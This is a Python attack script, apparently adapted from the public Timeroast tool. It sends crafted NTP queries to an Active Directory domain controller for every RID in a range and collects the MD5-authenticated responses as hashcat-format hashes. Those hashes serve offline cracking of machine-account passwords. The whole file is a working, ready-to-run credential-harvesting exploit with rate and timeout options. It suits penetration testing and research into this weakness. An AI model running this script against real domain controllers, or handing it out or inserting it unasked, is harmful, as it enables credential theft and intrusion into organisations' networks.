#!/usr/bin/env python3
##
## c/o https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py
##


"""
ntp_roast: A script to perform NTP Timeroast attacks against a DC using MD5 authenticator.
Outputs hashcat-compatible hashes for offline cracking, with optional verbose progress.
"""

import sys
from argparse import ArgumentParser, FileType, ArgumentTypeError, RawDescriptionHelpFormatter
from binascii import hexlify, unhexlify
from itertools import chain
from select import select
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack, unpack
from sys import stdout, stderr
from time import time
from typing import Iterable, List, Tuple

# --- Constants --------------------------------------------------------------
NTP_PREFIX = unhexlify(
    'db0011e9000000000001000000000000'
    'e1b8407debc7e5060000000000000000'
    '00000000000000e1b8428bffbfcd0a'
)
DEFAULT_RATE = 180         # Queries per second
DEFAULT_TIMEOUT = 24       # Seconds without response before quitting

# --- Core Functions --------------------------------------------------------
def parse_rid_ranges(arg: str) -> Iterable[int]:
    try:
        ranges = []
        for part in arg.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                if not (0 <= start < end < 2**31):
                    raise ValueError
                ranges.append(range(start, end + 1))
            else:
                rid = int(part)
                if not (0 <= rid < 2**31):
                    raise ValueError
                ranges.append([rid])
        return chain(*ranges)
    except Exception:
        raise ArgumentTypeError(f"Invalid RID ranges: '{arg}'")


def hashcat_format(rid: int, hashval: bytes, salt: bytes) -> str:
    return f"{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}"


def roast_ntp(
    dc_host: str,
    rids: Iterable[int],
    rate: int,
    timeout: float,
    use_old_password: bool,
    src_port: int,
    verbose: bool = False,
) -> List[Tuple[int, bytes, bytes]]:
    """
    Send timed NTP queries embedding each RID, collect hashes until timeout.
    If verbose, print progress and stats to stderr.
    """
    key_flag = (1 << 31) if use_old_password else 0
    results = []
    seen = set()
    last_response = time()
    start_time = last_response
    sent = 0

    with socket(AF_INET, SOCK_DGRAM) as sock:
        try:
            sock.bind(('0.0.0.0', src_port))
        except PermissionError:
            raise PermissionError(f"Unable to bind to port {src_port}; try running as root.")
        interval = 1.0 / rate
        rid_iter = iter(rids)

        while time() < last_response + timeout:
            rid = None
            try:
                rid = next(rid_iter)
            except StopIteration:
                if verbose:
                    print("All RIDs sent; waiting for remaining replies...", file=stderr)
                # continue to wait for pending replies
            if rid is not None:
                payload = NTP_PREFIX + pack('<I', rid ^ key_flag) + b'\x00' * 16
                sock.sendto(payload, (dc_host, 123))
                sent += 1
                if verbose and sent % rate == 0:
                    elapsed = time() - start_time
                    print(f"Sent {sent} queries in {elapsed:.1f}s ({sent/elapsed:.1f} qps)", file=stderr)

            ready, _, _ = select([sock], [], [], interval)
            if ready:
                data, _ = sock.recvfrom(120)
                if len(data) == 68:
                    salt = data[:48]
                    resp_rid = unpack('<I', data[-20:-16])[0] ^ key_flag
                    hash_val = data[-16:]
                    if resp_rid not in seen:
                        seen.add(resp_rid)
                        results.append((resp_rid, hash_val, salt))
                        last_response = time()
                        if verbose:
                            print(f"Got hash for RID {resp_rid} (total: {len(results)})", file=stderr)
        if verbose:
            total_time = time() - start_time
            print(f"Finished: {len(results)} hashes collected from {sent} queries in {total_time:.1f}s", file=stderr)
        return results

# --- Argument Parsing ------------------------------------------------------
def build_arg_parser() -> ArgumentParser:
    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description="Perform NTP Timeroast and output hashcat-formatted hashes.",
    )
    parser.add_argument('dc', help='DC hostname or IP for NTP queries.')
    parser.add_argument('-r', '--rids', type=parse_rid_ranges, default=range(1, 2**31),
                        help='Comma-separated RID list/ranges (e.g. "512-580,600").')
    parser.add_argument('-a', '--rate', type=int, default=DEFAULT_RATE,
                        help='Queries per second (default: %(default)s).')
    parser.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT,
                        help='Seconds to wait without responses (default: %(default)s).')
    parser.add_argument('-l', '--old-hashes', action='store_true',
                        help='Use previous password hashes.')
    parser.add_argument('-p', '--src-port', type=int, default=0,
                        help='Local UDP port to bind (default: dynamic).')
    parser.add_argument('-o', '--out', type=FileType('w'), default=stdout,
                        help='Output file for hashes (default: stdout).')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show progress and statistics.')
    return parser

# --- Entry Point ----------------------------------------------------------
def main() -> None:
    args = build_arg_parser().parse_args()
    try:
        results = roast_ntp(
            dc_host=args.dc,
            rids=args.rids,
            rate=args.rate,
            timeout=args.timeout,
            use_old_password=args.old_hashes,
            src_port=args.src_port,
            verbose=args.verbose,
        )
    except PermissionError as e:
        print(f"Error: {e}", file=stderr)
        sys.exit(1)

    for rid, hash_val, salt in results:
        print(hashcat_format(rid, hash_val, salt), file=args.out)

if __name__ == '__main__':
    main()
